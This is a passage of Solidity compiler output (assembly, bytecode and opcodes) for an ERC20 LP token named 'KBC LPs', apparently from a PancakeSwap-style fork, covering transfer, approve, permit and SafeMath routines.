\"ERC20.sol\":3734:3748  bytes32 digest */\n      swap2\n      swap4\n        /* \"ERC20.sol\":4073:4088  nonces[owner]++ */\n      swap3\n        /* \"ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      0x01e2\n      dup1\n      dup3\n      add\n      swap4\n      not(0x1f)\n      dup2\n      add\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n        /* \"ERC20.sol\":4073:4088  nonces[owner]++ */\n      dup6\n        /* \"ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_77\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_77:\n      pop\n      pop\n        /* \"ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      mload(add(not(0x1f), mload(0x40)))\n      swap2\n      pop\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":4280:4310  recoveredAddress != address(0) */\n      dup2\n      and\n      iszero\n      dup1\n      iszero\n      swap1\n        /* \"ERC20.sol\":4280:4339  recoveredAddress != address(0) && recoveredAddress == owner */\n      tag_78\n      jumpi\n      pop\n        /* \"ERC20.sol\":4334:4339  owner */\n      dup9\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":4314:4339  recoveredAddress == owner */\n      and\n        /* \"ERC20.sol\":4314:4330  recoveredAddress */\n      dup2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":4314:4339  recoveredAddress == owner */\n      and\n      eq\n        /* \"ERC20.sol\":4280:4339  recoveredAddress != address(0) && recoveredAddress == owner */\n    tag_78:\n        /* \"ERC20.sol\":4259:4391  require(... */\n      tag_79\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x1a\n      0x24\n      dup3\n      add\n      mstore\n      0x50616e63616b653a20494e56414c49445f5349474e4154555245000000000000\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_79:\n        /* \"ERC20.sol\":4401:4432  _approve(owner, spender, value) */\n      tag_80\n        /* \"ERC20.sol\":4410:4415  owner */\n      dup10\n        /* \"ERC20.sol\":4417:4424  spender */\n      dup10\n        /* \"ERC20.sol\":4426:4431  value */\n      dup10\n        /* \"ERC20.sol\":4401:4409  _approve */\n      tag_66\n        /* \"ERC20.sol\":4401:4432  _approve(owner, spender, value) */\n      jump\t// in\n    tag_80:\n        /* \"ERC20.sol\":3475:4439  function permit(... */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"ERC20.sol\":389:453  mapping(address => mapping(address => uint256)) public allowance */\n    tag_63:\n      0x02\n      0x20\n      swap1\n      dup2\n      mstore\n      0x00\n      swap3\n      dup4\n      mstore\n      0x40\n      dup1\n      dup5\n      keccak256\n      swap1\n      swap2\n      mstore\n      swap1\n      dup3\n      mstore\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":2410:2579  function _approve(address owner, address spender, uint256 value) private {... */\n    tag_66:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2493:2509  allowance[owner] */\n      dup1\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"ERC20.sol\":2493:2502  allowance */\n      0x02\n        /* \"ERC20.sol\":2493:2509  allowance[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"ERC20.sol\":2493:2518  allowance[owner][spender] */\n      swap5\n      dup8\n      and\n      dup1\n      dup5\n      mstore\n      swap5\n      dup3\n      mstore\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"ERC20.sol\":2493:2526  allowance[owner][spender] = value */\n      dup6\n      swap1\n      sstore\n        /* \"ERC20.sol\":2541:2572  Approval(owner, spender, value) */\n      dup2\n      mload\n      dup6\n      dup2\n      mstore\n      swap2\n      mload\n      0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n        /* \"ERC20.sol\":2410:2579  function _approve(address owner, address spender, uint256 value) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"SafeMath.sol\":339:475  function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_70:\n        /* \"SafeMath.sol\":431:436  x - y */\n      dup1\n      dup3\n      sub\n        /* \"SafeMath.sol\":426:442  (z = x - y) <= x */\n      dup3\n      dup2\n      gt\n      iszero\n        /* \"SafeMath.sol\":418:468  require((z = x - y) <= x, \"ds-math-sub-underflow\") */\n      tag_64\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x15\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x58, 0x64732d6d6174682d7375622d756e646572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n        /* \"ERC20.sol\":2585:2804  function _transfer(address from, address to, uint256 value) private {... */\n    tag_72:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2681:2696  balanceOf[from] */\n      dup4\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"ERC20.sol\":2681:2690  balanceOf */\n      0x01\n        /* \"ERC20.sol\":2681:2696  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"ERC20.sol\":2681:2707  balanceOf[from].sub(value) */\n      tag_85\n      swap1\n        /* \"ERC20.sol\":2701:2706  value */\n      dup3\n        /* \"ERC20.sol\":2681:2707  balanceOf[from].sub(value) */\n      0xffffffff\n        /* \"ERC20.sol\":2681:2700  balanceOf[from].sub */\n      tag_70\n        /* \"ERC20.sol\":2681:2707  balanceOf[from].sub(value) */\n      and\n      jump\t// in\n    tag_85:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2663:2678  balanceOf[from] */\n      dup1\n      dup6\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"ERC20.sol\":2663:2672  balanceOf */\n      0x01\n        /* \"ERC20.sol\":2663:2678  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      dup1\n      dup3\n      keccak256\n        /* \"ERC20.sol\":2663:2707  balanceOf[from] = balanceOf[from].sub(value) */\n      swap4\n      swap1\n      swap4\n      sstore\n        /* \"ERC20.sol\":2733:2746  balanceOf[to] */\n      swap1\n      dup5\n      and\n      dup2\n      mstore\n      keccak256\n      sload\n        /* \"ERC20.sol\":2733:2757  balanceOf[to].add(value) */\n      tag_86\n      swap1\n        /* \"ERC20.sol\":2751:2756  value */\n      dup3\n        /* \"ERC20.sol\":2733:2757  balanceOf[to].add(value) */\n      0xffffffff\n        /* \"ERC20.sol\":2733:2750  balanceOf[to].add */\n      tag_87\n        /* \"ERC20.sol\":2733:2757  balanceOf[to].add(value) */\n      and\n      jump\t// in\n    tag_86:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":2717:2730  balanceOf[to] */\n      dup1\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"ERC20.sol\":2717:2726  balanceOf */\n      0x01\n        /* \"ERC20.sol\":2717:2730  balanceOf[to] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"ERC20.sol\":2717:2757  balanceOf[to] = balanceOf[to].add(value) */\n      swap5\n      swap1\n      swap5\n      sstore\n        /* \"ERC20.sol\":2772:2797  Transfer(from, to, value) */\n      dup1\n      mload\n      dup6\n      dup2\n      mstore\n      swap1\n      mload\n        /* \"ERC20.sol\":2717:2730  balanceOf[to] */\n      swap2\n      swap4\n        /* \"ERC20.sol\":2772:2797  Transfer(from, to, value) */\n      swap3\n      dup8\n      and\n      swap3\n      0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n      swap3\n      swap2\n      dup3\n      swap1\n      sub\n      add\n      swap1\n      log3\n        /* \"ERC20.sol\":2585:2804  function _transfer(address from, address to, uint256 value) private {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"SafeMath.sol\":198:333  function add(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_87:\n        /* \"SafeMath.sol\":290:295  x + y */\n      dup1\n      dup3\n      add\n        /* \"SafeMath.sol\":285:301  (z = x + y) >= x */\n      dup3\n      dup2\n      lt\n      iszero\n        /* \"SafeMath.sol\":277:326  require((z = x + y) >= x, \"ds-math-add-overflow\") */\n      tag_64\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x14\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x60, 0x64732d6d6174682d6164642d6f766572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n\n    auxdata: 0xa265627a7a7231582000d3a072e2b19d1942fd6ff86893a1396bba021b0fb0958be6ff3a10da49b7d464736f6c63430005100032\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b5060405146908060526109b7823960408051918290036052018220828201825260078352664b4243204c507360c81b6020938401528151808301835260018152603160f81b908401528151808401919091527f6a36d39f32c2225411d16c8f56813b9117e6eb8bf3d2893c5fc62411565cfcfe818301527fc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6606082015260808101949094523060a0808601919091528151808603909101815260c090940190528251920191909120600455506108cc806100eb6000396000f3fe608060405234801561001057600080fd5b50600436106100ea5760003560e01c806347d5d8561161008c57806395d89b411161006657806395d89b411461029c578063a9059cbb146102a4578063d505accf146102d0578063dd62ed3e14610323576100ea565b806347d5d8561461022a57806370a08231146102505780637ecebe0014610276576100ea565b806323b872dd116100c857806323b872dd146101c657806330adf81f146101fc578063313ce567146102045780633644e51514610222576100ea565b806306fdde03146100ef578063095ea7b31461016c57806318160ddd146101ac575b600080fd5b6100f7610351565b6040805160208082528351818301528351919283929083019185019080838360005b83811015610131578181015183820152602001610119565b50505050905090810190601f16801561015e5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6101986004803603604081101561018257600080fd5b506001600160a01b038135169060200135610374565b604080519115158252519081900360200190f35b6101b461038b565b60408051918252519081900360200190f35b610198600480360360608110156101dc57600080fd5b506001600160a01b03813581169160208101359091169060400135610391565b6101b461042b565b61020c61044f565b6040805160ff9092168252519081900360200190f35b6101b4610454565b6101b46004803603602081101561024057600080fd5b50356001600160a01b031661045a565b6101b46004803603602081101561026657600080fd5b50356001600160a01b031661046c565b6101b46004803603602081101561028c57600080fd5b50356001600160a01b031661047e565b6100f7610490565b610198600480360360408110156102ba57600080fd5b506001600160a01b0381351690602001356104b2565b610321600480360360e08110156102e657600080fd5b506001600160a01b03813581169160208101359091169060408101359060608101359060ff6080820135169060a08101359060c001356104bf565b005b6101b46004803603604081101561033957600080fd5b506001600160a01b03813581169160200135166106bf565b604051806040016040528060078152602001664b4243204c507360c81b81525081565b60006103813384846106dc565b5060015b92915050565b60005481565b6001600160a01b038316600090815260026020908152604080832033845290915281205460001914610416576001600160a01b03841660009081526002602090815260408083203384529091529020546103f1908363ffffffff61073e16565b6001600160a01b03851660009081526002602090815260408083203384529091529020555b61042184848461078e565b5060019392505050565b7f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c981565b601281565b60045481565b60036020526000908152604090205481565b60016020526000908152604090205481565b60056020526000908152604090205481565b6040518060400160405280600681526020016504b42432d4c560d41b81525081565b600061038133848461078e565b42841015610507576040805162461bcd60e51b815260206004820152601060248201526f14185b98d85ad94e881156141254915160821b604482015290519081900360640190fd5b6004546001600160a01b0380891660008181526005602090815260408083208054600180820190925582517f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c98186015280840196909652958d166060860152608085018c905260a085019590955260c08085018b90528151808603909101815260e08501825280519083012061190160f01b6101008601526101028501969096526101228085019690965280518085039096018652610142840180825286519683019690962095839052610162840180825286905260ff89166101828501526101a284018890526101c28401879052519193926101e280820193601f1981019281900390910190855afa158015610622573d6000803e3d6000fd5b5050604051601f1901519150506001600160a01b038116158015906106585750886001600160a01b0316816001600160a01b0316145b6106a9576040805162461bcd60e51b815260206004820152601a60248201527f50616e63616b653a20494e56414c49445f5349474e4154555245000000000000604482015290519081900360640190fd5b6106b48989896106dc565b505050505050505050565b600260209081526000928352604080842090915290825290205481565b6001600160a01b03808416600081815260026020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b80820382811115610385576040805162461bcd60e51b815260206004820152601560248201527464732d6d6174682d7375622d756e646572666c6f7760581b604482015290519081900360640190fd5b6001600160a01b0383166000908152600160205260409020546107b7908263ffffffff61073e16565b6001600160a01b0380851660009081526001602052604080822093909355908416815220546107ec908263ffffffff61084816565b6001600160a01b0380841660008181526001602090815260409182902094909455805185815290519193928716927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef92918290030190a3505050565b80820182811015610385576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6164642d6f766572666c6f7760601b604482015290519081900360640190fdfea265627a7a7231582000d3a072e2b19d1942fd6ff86893a1396bba021b0fb0958be6ff3a10da49b7d464736f6c63430005100032454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD CHAINID SWAP1 DUP1 PUSH1 0x52 PUSH2 0x9B7 DUP3 CODECOPY PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 SWAP1 SUB PUSH1 0x52 ADD DUP3 KECCAK256 DUP3 DUP3 ADD DUP3 MSTORE PUSH1 0x7 DUP4 MSTORE PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL PUSH1 0x20 SWAP4 DUP5 ADD MSTORE DUP2 MLOAD DUP1 DUP4 ADD DUP4 MSTORE PUSH1 0x1 DUP2 MSTORE PUSH1 0x31 PUSH1 0xF8 SHL SWAP1 DUP5 ADD MSTORE DUP2 MLOAD DUP1 DUP5 ADD SWAP2 SWAP1 SWAP2 MSTORE PUSH32 0x6A36D39F32C2225411D16C8F56813B9117E6EB8BF3D2893C5FC62411565CFCFE DUP2 DUP4 ADD MSTORE PUSH32 0xC89EFDAA54C0F20C7ADF612882DF0950F5A951637E0307CDCB4C672F298B8BC6 PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x80 DUP2 ADD SWAP5 SWAP1 SWAP5 MSTORE ADDRESS PUSH1 0xA0 DUP1 DUP7 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP2 MLOAD DUP1 DUP7 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xC0 SWAP1 SWAP5 ADD SWAP1 MSTORE DUP3 MLOAD SWAP3 ADD SWAP2 SWAP1 SWAP2 KECCAK256 PUSH1 0x4 SSTORE POP PUSH2 0x8CC DUP1 PUSH2 0xEB PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xEA JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x47D5D856 GT PUSH2 0x8C JUMPI DUP1 PUSH4 0x95D89B41 GT PUSH2 0x66 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x29C JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x2A4 JUMPI DUP1 PUSH4 0xD505ACCF EQ PUSH2 0x2D0 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x323 JUMPI PUSH2 0xEA JUMP JUMPDEST DUP1 PUSH4 0x47D5D856 EQ PUSH2 0x22A JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x250 JUMPI DUP1 PUSH4 0x7ECEBE00 EQ PUSH2 0x276 JUMPI PUSH2 0xEA JUMP JUMPDEST DUP1 PUSH4 0x23B872DD GT PUSH2 0xC8 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x1C6 JUMPI DUP1 PUSH4 0x30ADF81F EQ PUSH2 0x1FC JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x204 JUMPI DUP1 PUSH4 0x3644E515 EQ PUSH2 0x222 JUMPI PUSH2 0xEA JUMP JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xEF JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x16C JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x1AC JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xF7 PUSH2 0x351 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x20 DUP1 DUP3 MSTORE DUP4 MLOAD DUP2 DUP4 ADD MSTORE DUP4 MLOAD SWAP2 SWAP3 DUP4 SWAP3 SWAP1 DUP4 ADD SWAP2 DUP6 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x131 JUMPI DUP2 DUP2 ADD MLOAD DUP4 DUP3 ADD MSTORE PUSH1 0x20 ADD PUSH2 0x119 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x15E JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x198 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x182 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x374 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 ISZERO ISZERO DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x1B4 PUSH2 0x38B JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x198 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x1DC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0x391 JUMP JUMPDEST PUSH2 0x1B4 PUSH2 0x42B JUMP JUMPDEST PUSH2 0x20C PUSH2 0x44F JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0xFF SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x1B4 PUSH2 0x454 JUMP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x240 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x45A JUMP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x266 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x46C JUMP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x28C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x47E JUMP JUMPDEST PUSH2 0xF7 PUSH2 0x490 JUMP JUMPDEST PUSH2 0x198 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x2BA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x4B2 JUMP JUMPDEST PUSH2 0x321 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0xE0 DUP2 LT ISZERO PUSH2 0x2E6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0x60 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xFF PUSH1 0x80 DUP3 ADD CALLDATALOAD AND SWAP1 PUSH1 0xA0 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xC0 ADD CALLDATALOAD PUSH2 0x4BF JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1B4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x339 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 ADD CALLDATALOAD AND PUSH2 0x6BF JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x7 DUP2 MSTORE PUSH1 0x20 ADD PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x381 CALLER DUP5 DUP5 PUSH2 0x6DC JUMP JUMPDEST POP PUSH1 0x1 JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE DUP2 KECCAK256 SLOAD PUSH1 0x0 NOT EQ PUSH2 0x416 JUMPI PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SLOAD PUSH2 0x3F1 SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x73E AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SSTORE JUMPDEST PUSH2 0x421 DUP5 DUP5 DUP5 PUSH2 0x78E JUMP JUMPDEST POP PUSH1 0x1 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 JUMP JUMPDEST PUSH1 0x12 DUP2 JUMP JUMPDEST PUSH1 0x4 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x5 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x6 DUP2 MSTORE PUSH1 0x20 ADD PUSH6 0x4B42432D4C5 PUSH1 0xD4 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x381 CALLER DUP5 DUP5 PUSH2 0x78E JUMP JUMPDEST TIMESTAMP DUP5 LT ISZERO PUSH2 0x507 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x10 PUSH1 0x24 DUP3 ADD MSTORE PUSH16 0x14185B98D85AD94E8811561412549151 PUSH1 0x82 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x4 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP10 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x5 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 DUP1 SLOAD PUSH1 0x1 DUP1 DUP3 ADD SWAP1 SWAP3 SSTORE DUP3 MLOAD PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 DUP7 ADD MSTORE DUP1 DUP5 ADD SWAP7 SWAP1 SWAP7 MSTORE SWAP6 DUP14 AND PUSH1 0x60 DUP7 ADD MSTORE PUSH1 0x80 DUP6 ADD DUP13 SWAP1 MSTORE PUSH1 0xA0 DUP6 ADD SWAP6 SWAP1 SWAP6 MSTORE PUSH1 0xC0 DUP1 DUP6 ADD DUP12 SWAP1 MSTORE DUP2 MLOAD DUP1 DUP7 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0xE0 DUP6 ADD DUP3 MSTORE DUP1 MLOAD SWAP1 DUP4 ADD KECCAK256 PUSH2 0x1901 PUSH1 0xF0 SHL PUSH2 0x100 DUP7 ADD MSTORE PUSH2 0x102 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE PUSH2 0x122 DUP1 DUP6 ADD SWAP7 SWAP1 SWAP7 MSTORE DUP1 MLOAD DUP1 DUP6 SUB SWAP1 SWAP7 ADD DUP7 MSTORE PUSH2 0x142 DUP5 ADD DUP1 DUP3 MSTORE DUP7 MLOAD SWAP7 DUP4 ADD SWAP7 SWAP1 SWAP7 KECCAK256 SWAP6 DUP4 SWAP1 MSTORE PUSH2 0x162 DUP5 ADD DUP1 DUP3 MSTORE DUP7 SWAP1 MSTORE PUSH1 0xFF DUP10 AND PUSH2 0x182 DUP6 ADD MSTORE PUSH2 0x1A2 DUP5 ADD DUP9 SWAP1 MSTORE PUSH2 0x1C2 DUP5 ADD DUP8 SWAP1 MSTORE MLOAD SWAP2 SWAP4 SWAP3 PUSH2 0x1E2 DUP1 DUP3 ADD SWAP4 PUSH1 0x1F 